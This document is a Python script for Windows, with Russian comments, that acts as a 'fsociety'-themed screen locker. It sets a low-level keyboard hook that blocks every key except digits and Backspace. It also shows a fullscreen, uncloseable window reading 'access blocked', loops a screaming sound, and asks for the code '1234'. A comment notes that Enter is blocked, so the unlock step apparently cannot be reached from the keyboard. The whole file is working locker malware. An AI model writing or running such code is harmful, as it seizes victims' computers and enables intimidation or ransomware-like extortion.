import tkinter as tk
import numpy as np
import tempfile
import os
import wave
import winsound
import ctypes
from ctypes import wintypes

# ==========================================
# 0. ПРАВИЛЬНЫЙ НИЗКОУРОВНЕВЫЙ ХУК КЛАВИАТУРЫ (Windows API)
# ==========================================
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
WM_KEYUP = 0x0101
WM_SYSKEYUP = 0x0105

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

# Правильная сигнатура: LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
LowLevelKeyboardProc = ctypes.WINFUNCTYPE(
    ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM
)

def hook_proc(nCode, wParam, lParam):
    if nCode >= 0:
        # Перехватываем ВСЕ события нажатия и отпускания клавиш
        if wParam in (WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, WM_SYSKEYUP):
            kbd = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            vk = kbd.vkCode

            # Разрешенные клавиши: цифры 0-9 (основной ряд и Numpad) + Backspace
            is_digit = (0x30 <= vk <= 0x39) or (0x60 <= vk <= 0x69)
            is_backspace = (vk == 0x08)
            
            # Если клавиша не разрешена, полностью блокируем ее (возврат 1)
            if not is_digit and not is_backspace:
                return 1

    # Пропускаем событие дальше, если оно разрешено
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

# Установка хука с проверкой на ошибку
hook_proc_ptr = LowLevelKeyboardProc(hook_proc)
hook_handle = user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc_ptr, kernel32.GetModuleHandleW(None), 0)

if not hook_handle:
    print("Не удалось установить хук! Запустите скрипт от имени администратора.")

# Снятие хука при выходе
def remove_hook():
    if hook_handle:
        user32.UnhookWindowsHookEx(hook_handle)

# ==========================================
# 1. ЗВУК: ЖУТКИЕ КРИКИ + ГУЛ
# ==========================================
def generate_scary_sound():
    try:
        sample_rate = 44100
        duration = 8
        t = np.linspace(0, duration, int(sample_rate * duration), False)
        
        audio = np.sin(2 * np.pi * 18 * t) * 0.3
        audio += np.sin(2 * np.pi * 45 * t) * 0.2
        audio += np.random.normal(0, 0.08, len(t))
        
        for i in range(0, len(t), sample_rate * 2):
            if i + 1000 < len(t):
                base_freq = np.random.randint(800, 2200)
                dur = 0.7
                t_cry = np.linspace(0, dur, int(sample_rate * dur))
                cry = np.sin(2 * np.pi * base_freq * t_cry)
                cry += np.sin(2 * np.pi * (base_freq * 1.3) * t_cry) * 0.6
                cry += np.sin(2 * np.pi * (base_freq * 0.7) * t_cry) * 0.4
                cry = np.tanh(cry * 3) 
                env = np.exp(-3 * t_cry)
                cry *= env * 3.0 
                audio[i:i+len(t_cry)] += cry
                
        audio = audio * 32767 / np.max(np.abs(audio))
        audio = audio.astype(np.int16)

        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.wav')
        with wave.open(temp_file.name, 'wb') as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(sample_rate)
            wf.writeframes(audio.tobytes())
        
        winsound.PlaySound(temp_file.name, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
    except Exception as e:
        print(f"Sound error: {e}")

generate_scary_sound()

# ==========================================
# 2. РУЧНАЯ ПИКСЕЛЬНАЯ МАСКА
# ==========================================
MASK = [
    "       ##      ##       ",
    "       ###    ###       ",
    "      ####    ####      ",
    "      ###      ###      ",
    "     ####      ####     ",
    "     ###        ###     ",
    "     ##          ##     ",
    "     ###############     ",
    "     ###############     ",
    "     ###.........###     ",
    "     ##...........##     ",
    "     #.............#     ",
    "     ##...........##     ",
    "     ###.........###     ",
    "     ###############     ",
    "     ###############     ",
    "      #############      ",
    "      ###..###..###      ",
    "      ##....#....##      ",
    "      ##....#....##      ",
    "       ##..###..##       ",
    "        ##########       ",
    "         ########        ",
    "          ######         ",
    "           ####          ",
    "           ####          ",
    "            ##           ",
]

def draw_custom_mask(canvas, center_x, center_y, pixel_size=20):
    rows = len(MASK)
    cols = len(MASK[0])
    for y, row in enumerate(MASK):
        for x, char in enumerate(row):
            x1 = center_x + (x - cols/2) * pixel_size
            y1 = center_y + (y - rows/2) * pixel_size
            x2 = x1 + pixel_size
            y2 = y1 + pixel_size
            if char == '#':
                canvas.create_rectangle(x1, y1, x2, y2, fill="white", outline="white")
            elif char == '.':
                canvas.create_rectangle(x1, y1, x2, y2, fill="#111111", outline="#111111")

# ==========================================
# 3. ОКНО И ИНТЕРФЕЙС
# ==========================================
root = tk.Tk()
W, H = root.winfo_screenwidth(), root.winfo_screenheight()

root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.configure(bg="#8B0000")
root.protocol("WM_DELETE_WINDOW", lambda: None)

canvas = tk.Canvas(root, width=W, height=H, bg="#8B0000", highlightthickness=0)
canvas.pack(fill=tk.BOTH, expand=True)

CENTER_X = W // 2
CENTER_Y = H // 2
MASK_HEIGHT = len(MASK) * 20
MASK_Y = CENTER_Y - (MASK_HEIGHT // 2) - 100 

draw_custom_mask(canvas, CENTER_X, MASK_Y, pixel_size=20)

Y_OFFSET = MASK_HEIGHT // 2 + 60
canvas.create_text(CENTER_X, MASK_Y + Y_OFFSET,
                   text="FSOCIETY", font=("Impact", 100, "bold"), fill="black")
canvas.create_text(CENTER_X, MASK_Y + Y_OFFSET + 100,
                   text="ДОСТУП ЗАБЛОКИРОВАН", font=("Arial", 30, "bold"), fill="white")

entry_var = tk.StringVar()
entry = tk.Entry(root, textvariable=entry_var, font=("Arial", 35, "bold"),
                 justify="center", show="*", bg="black", fg="green",
                 insertbackground="white", width=10,
                 relief="solid", borderwidth=4, highlightthickness=2, highlightbackground="black")

entry_window = canvas.create_window(CENTER_X, MASK_Y + Y_OFFSET + 200, window=entry, width=350, height=80)
entry.focus_set()

# Дополнительная валидация ввода (только цифры и Backspace)
def validate_entry(char):
    return char.isdigit() or char == '\x08'

vcmd = (root.register(validate_entry), '%S')
entry.config(validate="key", validatecommand=vcmd)

# ==========================================
# 4. ЛОГИКА РАЗБЛОКИРОВКИ
# ==========================================
def unlock():
    if entry_var.get() == "1234":
        remove_hook()
        winsound.PlaySound(None, winsound.SND_PURGE)
        root.destroy()
    else:
        entry_var.set("")
        import random
        for _ in range(10):
            canvas.move(entry_window, random.randint(-15, 15), random.randint(-15, 15))
            root.update()
            root.after(15)
        canvas.coords(entry_window, CENTER_X, MASK_Y + Y_OFFSET + 200)

root.bind("<Return>", lambda e: unlock()) # Enter заблокирован хуком, но оставлен как запасной вариант
root.bind("<Escape>", lambda e: None)
root.bind("<Tab>", lambda e: None)

def flicker_text():
    items = canvas.find_all()
    for item in items:
        if canvas.type(item) == "text" and canvas.itemcget(item, "text") == "ДОСТУП ЗАБЛОКИРОВАН":
            current_color = canvas.itemcget(item, "fill")
            new_color = "grey" if current_color == "white" else "white"
            canvas.itemconfig(item, fill=new_color)
            break
    root.after(500, flicker_text)

flicker_text()

root.mainloop()